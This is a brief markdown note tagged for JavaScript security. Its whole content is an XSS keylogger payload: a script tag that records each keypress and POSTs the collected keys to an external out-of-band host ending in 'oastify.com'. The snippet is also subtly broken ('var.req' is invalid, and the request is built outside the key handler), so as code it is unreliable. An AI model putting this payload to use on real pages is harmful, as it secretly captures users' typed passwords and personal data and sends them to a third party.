---
tags:
  - programming
  - javascript
  - security
---
```js
<script type="text/javascript">
	var l = ""
	document.onkeypress = function (e) {
		l += e.key;
		var.req = new XMLHttpRequest();
	}
req.open("POST", "http://...oastify.com", true);
req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
req.send("data=" + l);
</script>
```